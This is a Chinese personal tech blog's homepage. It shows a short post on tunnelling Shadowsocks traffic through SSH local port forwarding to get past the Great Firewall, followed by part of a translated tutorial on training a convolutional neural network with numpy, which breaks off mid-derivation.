<!DOCTYPE html>












  


  


<html class="theme-next pisces use-motion han-js-rendered no-han-space" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">






  <!--  -->
  
  
  <link rel="stylesheet" href="https://ethantw.github.io/Han/latest/han.min.css">



  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">














  
  
  
  

  

  

  

  

  

  







<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.1.0">



  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=7.1.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico?v=7.1.0">








<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '7.1.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="晚来天雨雪，能饮一杯无？">
<meta property="og:type" content="website">
<meta property="og:title" content="治部少辅">
<meta property="og:url" content="http://www.codewoody.com/index.html">
<meta property="og:site_name" content="治部少辅">
<meta property="og:description" content="晚来天雨雪，能饮一杯无？">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="治部少辅">
<meta name="twitter:description" content="晚来天雨雪，能饮一杯无？">



  <link rel="alternate" href="/atom.xml" title="治部少辅" type="application/atom+xml">



  
  
  <link rel="canonical" href="http://www.codewoody.com/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>治部少辅</title>
  




  <script async src="//www.googletagmanager.com/gtag/js?id=UA-114736006-1"></script>
  <script>
    var host = window.location.hostname;
    if (host !== "localhost" || !true) {
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-114736006-1');
    }
  </script>









  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">治部少辅</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <h1 class="site-subtitle" itemprop="description">大一大万大吉</h1>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home menu-item-active">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-knowledge">

    
    
    
      
    

    

    <a href="/knowledge-base" rel="section"><i class="menu-item-icon fa fa-fw fa-book"></i> <br>knowledge</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-weekly">

    
    
    
      
    

    

    <a href="/categories/Weekly/" rel="section"><i class="menu-item-icon fa fa-fw fa-newspaper-o"></i> <br>weekly</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-updates">

    
    
    
      
    

    

    <a href="/update" rel="section"><i class="menu-item-icon fa fa-fw fa-edit"></i> <br>updates</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-channel">

    
    
    
      
    

    

    <a href="https://t.me/everthingaboutbullshit" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-signal"></i> <br>channel</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>

  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    
  
  

  

  <a href="https://github.com/huangy10" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>



    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/11710/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/11710/" class="post-title-link" itemprop="url">SSH隧道:访问翻墙服务器的临时性手段</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-03-01 10:01:35 / Modified: 10:17:48" itemprop="dateCreated datePublished" datetime="2020-03-01T10:01:35+08:00">2020-03-01</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/教程/" itemprop="url" rel="index"><span itemprop="name">教程</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/11710/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/11710/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          
            <p>现在GFW不断加高，翻墙的服务搞不好什么时候就挂了，之前我在文章里介绍过比较稳定的方法是使用一台能够从ipv4到ipv6的跳板机。但跳板机挂了就糟糕了。这篇文章就是我昨天遇到这个问题时弄的一个临时性办法，可以在Shadowsocks流量被拦截，跳板机挂掉的情况下，使用SSH隧道连接翻墙服务器以使用Shadowsocks的服务。</p>
<p>最近因为新冠肺炎疫情的关系，GFW对于翻墙流量的审查更加严格了，基于Ipv4的直连方式访问Shadowsocks基本不可能了。但是GFW的拦截基本针对流量特征的，有些服务器的IP实际上并未处于黑名单中。因此我们使用别的方式还是能够连接到翻墙服务器的。例如SSH访问服务器就能成功。这时我们可以使用SSH开通一个从我们本地电脑的localhost到翻墙服务器的localhost的隧道，将我们本地的地址的端口映射到翻墙服务器的本地地址端口。这样我们通过本地地址端口访问远端的Shadowsocks的服务时，我们的客户端和服务器的通信流量就不再是Shadowsocks流量，而是SSH特征的流量，这样通信就可以绕过GFW的检查了。</p>
<p>完整的SSH隧道的教程网络上能搜到很多，比如<a href="https://www.ssh.com/ssh/tunneling/example" target="_blank" rel="noopener">这篇</a>。我们只需要使用Local Forwarding模式。这个模式下，客户端的本地端口被映射到服务端的端口。命令的基本形式如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L local_addr:local_port:remote_addr:remote_port username@jump-server-addr</span><br></pre></td></tr></table></figure>
<p>如果我们的翻墙服务器的地址是<code>jump.server.com</code>，用户名是<code>ss</code>，Shadowsocks服务的端口是<code>11111</code>则使用下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8000:localhost:111111 ss@jump.server.com</span><br></pre></td></tr></table></figure>
<p>我们就可以将我们本地的<code>8000</code>端口映射到Shadowsocks的服务端口上。在Shadowsocks设置中，原本的设置只需要将地址修改为localhost，端口修改8000，就可以访问远端的Shadowsocks服务了。</p>
<p>不过上面的命令会打开一个SSH会话，如果我们退出这个会话，会导致隧道中断。因此我们改进命令为</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -f -L 8000:localhost:111111 ss@jump.server.com</span><br></pre></td></tr></table></figure>
<p>这个命令会在打开SSH隧道，将ssh进程转到后台运行。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/59775/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="治部少辅">
      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="治部少辅">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                
                <a href="/posts/59775/" class="post-title-link" itemprop="url">[翻译]从头开始训练一个卷积神经网络</a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-02-29 21:01:12" itemprop="dateCreated datePublished" datetime="2020-02-29T21:01:12+08:00">2020-02-29</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-03-01 10:02:48" itemprop="dateModified" datetime="2020-03-01T10:02:48+08:00">2020-03-01</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/教程/" itemprop="url" rel="index"><span itemprop="name">教程</span></a></span>

                
                
              
            </span>
          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Comments: </span>
                <a href="/posts/59775/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/59775/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body han-init-context" itemprop="articleBody">

      
      

      
        
          
            <p>原文地址是: <a href="https://towardsdatascience.com/training-a-convolutional-neural-network-from-scratch-2235c2a25754" target="_blank" rel="noopener">Training a Convolutional Neural Network from scratch</a>。原文的撰写时间是2019年6月7日。</p>
<p>在这篇文章中，我们将会深入了解卷积神经网络(Convolutional Neural Networks, CNN)，重点是如何训练一个卷积神经网络。这篇文章会教你如何推导梯度，实现backprop过程（只使用numpy），并最终建立起一个完整的训练的工作流。这里我们架设你对于什么是卷积神经网络有一个基础的了解。如果你还缺乏最基本的知识，可以阅读原文作者的<a href="https://victorzhou.com/blog/intro-to-cnns-part-1/" target="_blank" rel="noopener">文章</a>。同时文章中部分地方还假定你对于多元微积分有一定的了解<span class="foot-note-span">【基本上你好好上过大学的高等数学应该就能理解】</span>。</p>
<h2 id="搭建环境">搭建环境</h2>
<p>我们的主要任务是用CNN来解决<a href="http://yann.lecun.com/exdb/mnist/" target="_blank" rel="noopener">MNIST</a>手写数字字符的识别问题。</p>
<p><img src="https://imgs.codewoody.com/uploads/big/88955ef5145051fb920e6060b337900e.png"></p>
<p>这里我们的CNN网络有一个卷积层(Conv Layer)，一个Max Pooling层和一个Softmax层，如下图所示：</p>
<figure>
<img src="https://imgs.codewoody.com/uploads/big/ed825d814cb7744f836ed4a13c35fae2.png" alt="这个模型接受MNIST中28*28的灰度图输出，并输出一个10维向量，向量的每一维对应一个数字。"><figcaption>这个模型接受MNIST中28*28的灰度图输出，并输出一个10维向量，向量的每一维对应一个数字。</figcaption>
</figure>
<p>在代码层面，我们写了三个类，每个类代表一个层。这三个类分别是: <code>Conv3x3</code>, <code>MaxPool</code>和<code>Softmax</code>。每个类实现了一个<code>forward()</code>函数，用来进行CNN模型的正向计算。代码内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">conv = Conv3x3(<span class="number">8</span>)                  <span class="comment"># 28x28x1 -&gt; 26x26x8</span></span><br><span class="line">pool = MaxPool2()                  <span class="comment"># 26x26x8 -&gt; 13x13x8</span></span><br><span class="line">softmax = Softmax(<span class="number">13</span> * <span class="number">13</span> * <span class="number">8</span>, <span class="number">10</span>) <span class="comment"># 13x13x8 -&gt; 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(image, label)</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  Completes a forward pass of the CNN and calculates the accuracy and</span></span><br><span class="line"><span class="string">  cross-entropy loss.</span></span><br><span class="line"><span class="string">  - image is a 2d numpy array</span></span><br><span class="line"><span class="string">  - label is a digit</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">  <span class="comment"># We transform the image from [0, 255] to [-0.5, 0.5] to make it easier</span></span><br><span class="line">  <span class="comment"># to work with. This is standard practice.</span></span><br><span class="line">  out = conv.forward((image / <span class="number">255</span>) - <span class="number">0.5</span>)</span><br><span class="line">  out = pool.forward(out)</span><br><span class="line">  out = softmax.forward(out)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Calculate cross-entropy loss and accuracy. np.log() is the natural log.</span></span><br><span class="line">  loss = -np.log(out[label])</span><br><span class="line">  acc = <span class="number">1</span> <span class="keyword">if</span> np.argmax(out) == label <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> out, loss, acc</span><br></pre></td></tr></table></figure>
<p>代码的完整地址在<a href="https://github.com/vzhou842/cnn-from-scratch" target="_blank" rel="noopener">Github</a>。</p>
<p>直接运行输出得到的结果是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MNIST CNN initialized!</span><br><span class="line">[Step 100] Past 100 steps: Average Loss 2.302 | Accuracy: 11%</span><br><span class="line">[Step 200] Past 100 steps: Average Loss 2.302 | Accuracy: 8%</span><br><span class="line">[Step 300] Past 100 steps: Average Loss 2.302 | Accuracy: 3%</span><br><span class="line">[Step 400] Past 100 steps: Average Loss 2.302 | Accuracy: 12%</span><br></pre></td></tr></table></figure>
<p>这里模型给出的精度非常差，这是因为模型还未进行训练。</p>
<h2 id="模型训练">模型训练</h2>
<p>训练一个神经网络通常由两个阶段组成：</p>
<ol type="1">
<li>forward阶段：在forward阶段，我们将输入送入模型，正向计算出结果；</li>
<li>backward阶段：用于计算梯度并更新权重参数；</li>
</ol>
<p>我们遵循上述模式来训练我们的CNN。这里我们采用了两个主要的实现设计思路：</p>
<ol type="1">
<li>在forward阶段，每个层会缓存下所有的数据，包括输入和中间变量，这些缓存下来的值会用于backward阶段的计算。</li>
<li>在backwad阶段，每个层会接收到后一层的梯度，并返回本层计算出来的梯度。</li>
</ol>
<p>这种设计思路可以让我们的训练实现保持间接和组织化。反映这一点最好的方式是直接读代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Feed forward</span></span><br><span class="line">out = conv.forward((image / <span class="number">255</span>) - <span class="number">0.5</span>)</span><br><span class="line">out = pool.forward(out)</span><br><span class="line">out = softmax.forward(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate initial gradient</span></span><br><span class="line">gradient = np.zeros(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Backprop</span></span><br><span class="line">gradient = softmax.backprop(gradient)</span><br><span class="line">gradient = pool.backprop(gradient)</span><br><span class="line">gradient = conv.backprop(gradient)</span><br></pre></td></tr></table></figure>
<p>接下来我们来讨论每一层的backprop怎么做（forward其实是非常简单的）。</p>
<h2 id="backprop-softmax">Backprop: Softmax</h2>
<p>按照backward的顺序我们首先讨论Softmax层。首先我们来回忆一下交叉信息熵损失函数的定义：</p>
<p><span class="math display">\[
L = - ln (p_c)
\]</span></p>
<p>其中<span class="math inline">\(p_c\)</span>为正确类别的 c 的预测概率。首先我们要计算的是在backfowrad阶段Softmax输入，<span class="math inline">\(\partial L / \partial out_s\)</span>，其中<span class="math inline">\(out_s\)</span>为Softmax的输出，这个输出为一个10维向量，其中每个元素是对应数字的概率。这个计算很简单：</p>
<p><span class="math display">\[
\frac{\partial L}{\partial o u t_{s}(i)}=\left\{\begin{array}{ll}
0 &amp; \text { if } i \neq c \\
-\frac{1}{p_{i}} &amp; \text { if } i=c
\end{array}\right.
\]</span></p>
<p>其中<span class="math inline">\(c\)</span>为正确的类别。代码的实现为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gradient = np.zeros(<span class="number">10</span>)</span><br><span class="line">gradeint[label] = <span class="number">-1</span> / out[label]</span><br></pre></td></tr></table></figure>
<p>这里得到的是Softmax层在backforward阶段的输入，Softmax需要以此为输入计算出一个梯度交给前面的层。我们先来看forward阶段的实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Softmax</span>:</span></span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, input)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Performs a forward pass of the softmax layer using the given input.</span></span><br><span class="line"><span class="string">    Returns a 1d numpy array containing the respective probability values.</span></span><br><span class="line"><span class="string">    - input can be any array with any dimensions.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    self.last_input_shape = input.shape</span><br><span class="line"></span><br><span class="line">    input = input.flatten()</span><br><span class="line">    self.last_input = input</span><br><span class="line"></span><br><span class="line">    input_len, nodes = self.weights.shape</span><br><span class="line"></span><br><span class="line">    totals = np.dot(input, self.weights) + self.biases</span><br><span class="line">    self.last_totals = totals</span><br><span class="line"></span><br><span class="line">    exp = np.exp(totals)</span><br><span class="line">    <span class="keyword">return</span> exp / np.sum(exp, axis=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>从这里的代码来看，作者说的Softmax层其实是一个全连接层 + Softmax函数</p>
</blockquote>
<p>我们缓存了三个变量：</p>
<ul>
<li><code>input</code>的形状</li>
<li><code>input</code>展平后的值</li>
<li><code>totals</code>，softmax激励函数的输入</li>
</ul>
<p>基于上面这三个缓存的值我们可以开始计算梯度。上面我们已经计算了Softmax backprop的输入，可以发现只有<code>out_s(c)</code>是非零的，因此我们在Softmax内部计算的时候可以忽略其他项目，即我们只需要计算<span class="math inline">\(out_c\)</span>关于输入的微分。<code>out_s(c)</code>的计算过程是：</p>
<p><span class="math display">\[
o u t_{s}(c)=\frac{e^{t_{c}}}{\sum_{i} e^{t_{i}}}=\frac{e^{t_{c}}}{S}
\]</span></p>
<p>根据链式法则可以做计算，对于<span class="math inline">\(k \neq c\)</span>：</p>
<p><span class="math display">\[
\begin{aligned}
\frac{\partial o u t_{s}(c)}{\partial t_{k}} &amp;=-e^{t_{c}} S^{-2}\left(\frac{\partial S}{\partial t_{k}}\right) \\
&amp;=-e^{t_{c}} S^{-2}\left(e^{t_{k}}\right) \\
&amp;=\frac{-e^{t_{c}} e^{t_{k}}}{S^{2}}
\end{aligned}
\]</span></p>
<p>对于<span class="math inline">\(t_c\)</span></p>
<p><span class="math display">\[
\begin{aligned}
\frac{\partial o u t_{s}(c)}{\partial t_{c}} &amp;=\frac{S e^{t_{c}}-e^{t_{c}} \frac{\partial S}{\partial t_{c}}}{S^{2}} \\
&amp;=\frac{S e^{t_{c}}-e^{t_{c}} e^{t_{c}}}{S^{2}} \\
&amp;=\frac{e^{t_{c}}\left(S-e^{t_{c}}\right)}{S^{2}}
\end{aligned}
\]</span></p>
<p>我们把这部分用代码实现出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Softmax</span>:</span></span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">backprop</span><span class="params">(self, d_L_d_out)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Performs a backward pass of the softmax layer.</span></span><br><span class="line"><span class="string">    Returns the loss gradient for this layer's inputs.</span></span><br><span class="line"><span class="string">    - d_L_d_out is the loss gradient for this layer's outputs.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment"># We know only 1 element of d_L_d_out will be nonzero</span></span><br><span class="line">    <span class="keyword">for</span> i, gradient <span class="keyword">in</span> enumerate(d_L_d_out):</span><br><span class="line">      <span class="keyword">if</span> (gradient == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># e^totals</span></span><br><span class="line">      t_exp = np.exp(self.last_totals)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Sum of all e^totals</span></span><br><span class="line">      S = np.sum(t_exp)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of out[i] against totals</span></span><br><span class="line">      d_out_d_t = - t_exp[i] * t_exp / (S ** <span class="number">2</span>)</span><br><span class="line">      d_out_d_t[i] = t_exp[i] * (S - t_exp[i]) / (S ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># ... to be continued</span></span><br></pre></td></tr></table></figure>
<p>这里得到还只是对中间变量的梯度，最终我们要得到的是对Weights, bias以及input的梯度，其中：</p>
<ol type="1">
<li>我们使用<span class="math inline">\(\partial \mathrm{L} / \partial \mathrm{W}\)</span> 来更新Weights矩阵；</li>
<li>我们使用<span class="math inline">\(\partial \mathrm{L} / \partial \mathrm{b}\)</span> 来更新bias向量;</li>
<li><span class="math inline">\(\partial \mathrm{L} / \partial i n p u t\)</span>被送往上一层；</li>
</ol>
<p>为了计算这三个梯度，我们从下面的式子出发：</p>
<p><span class="math display">\[
t=w \cdot input +b
\]</span></p>
<p>这些梯度计算都比较简单：</p>
<span class="math display">\[\begin{aligned}
&amp;\frac{\partial t}{\partial w}=i n p u t\\
&amp;\frac{\partial t}{\partial b}=1\\
&amp;\frac{\partial t}{\partial i n p u t}=w
\end{aligned}\]</span>
<p>利用链式法则汇总</p>
<span class="math display">\[\begin{aligned}
\frac{\partial L}{\partial w} &amp;=\frac{\partial L}{\partial o u t} * \frac{\partial o u t}{\partial t} * \frac{\partial t}{\partial w} \\
\frac{\partial L}{\partial b} &amp;=\frac{\partial L}{\partial o u t} * \frac{\partial o u t}{\partial t} * \frac{\partial t}{\partial b} \\
\frac{\partial L}{\partial i n p u t} &amp;=\frac{\partial L}{\partial o u t} * \frac{\partial o u t}{\partial t} * \frac{\partial t}{\partial i n p u t}
\end{aligned}\]</span>
<p>将这些代码话就可以得到</p>
